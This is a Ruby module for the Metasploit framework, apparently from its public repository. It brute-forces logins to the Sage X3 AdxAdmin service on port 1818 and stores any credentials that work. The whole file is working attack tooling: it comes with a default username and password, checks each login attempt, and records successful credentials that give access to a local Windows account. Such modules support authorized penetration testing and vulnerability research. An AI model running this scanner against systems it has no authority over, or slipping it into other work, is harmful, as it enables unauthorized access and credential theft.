##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/x3'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Remote::Tcp

  def initialize(_info = {})
    super(
      'Name' => 'Sage X3 AdxAdmin Login Scanner',
      'Description' => %q{
        This module allows an attacker to perform a password guessing attack against
        the Sage X3 AdxAdmin service, which in turn can be used to authenticate to
        a local Windows account.

        This module implements the X3Crypt function to 'encrypt' any passwords to
        be used during the authentication process, given a plaintext password.
      },
      'Author' => ['Jonathan Peterson <deadjakk[at]shell.rip>'], # @deadjakk
      'License' => MSF_LICENSE,
      'References' => [
        ['URL', 'https://www.rapid7.com/blog/post/2021/07/07/cve-2020-7387-7390-multiple-sage-x3-vulnerabilities/']
      ]
      )

    register_options(
      [
        Opt::RPORT(1818),
        OptString.new('USERNAME', [false, 'User with which to authenticate to the AdxAdmin service', 'x3admin']),
        OptString.new('PASSWORD', [false, 'Plaintext password with which to authenticate', 's@ge2020'])
      ]
    )

    deregister_options('PASSWORD_SPRAY', 'BLANK_PASSWORDS')
  end

  def run_host(ip)
    cred_collection = build_credential_collection(
      blank_passwords: false,
      password: datastore['PASSWORD'],
      username: datastore['USERNAME']
    )

    scanner = Metasploit::Framework::LoginScanner::X3.new(
      host: ip,
      port: rport,
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
      max_send_size: datastore['TCP::max_send_size'],
      send_delay: datastore['TCP::send_delay'],
      framework: framework,
      framework_module: self,
      local_port: datastore['CPORT'],
      local_host: datastore['CHOST']
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )

      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute(level: :good, ip: ip, msg: "Success: '#{result.credential}'")
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)
        next
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        vprint_brute(level: :verror, ip: ip, msg: "Could not connect: #{result.proof}")
      when Metasploit::Model::Login::Status::INCORRECT
        vprint_brute(level: :verror, ip: ip, msg: "Failed: '#{result.credential}'")
      end

      invalidate_login(credential_data)
    end
  end

end
